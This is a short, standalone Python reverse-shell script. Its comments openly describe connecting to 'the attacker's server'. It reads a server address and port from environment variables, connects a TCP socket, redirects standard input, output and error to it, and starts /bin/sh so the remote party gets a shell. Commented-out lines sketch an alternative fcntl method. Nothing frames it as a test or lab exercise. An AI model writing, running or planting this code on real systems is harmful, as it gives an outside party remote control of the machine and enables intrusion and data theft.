import os
import socket
import sys
import fcntl

def main():
    # Read server IP and port from environment variables
    SERVER_IP = os.getenv("REVERSE_SHELL_SERVER", "127.0.0.1")
    SERVER_PORT = int(os.getenv("REVERSE_SHELL_PORT", "4444"))

    try:
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the attacker's server
        sock.connect((SERVER_IP, SERVER_PORT))

        # Duplicate the socket to stdin, stdout, and stderr
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr

        # In alternative, attacker could use fcntl to duplicate the socket
        # os.close(sys.stdin.fileno())
        # os.close(sys.stdout.fileno())
        # os.close(sys.stderr.fileno())
        # fcntl.fcntl(sock.fileno(), fcntl.F_DUPFD) # stdin
        # fcntl.fcntl(sock.fileno(), fcntl.F_DUPFD) # stdout
        # fcntl.fcntl(sock.fileno(), fcntl.F_DUPFD) # stderr

        # Execute a shell
        os.execl("/bin/sh", "-i")

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
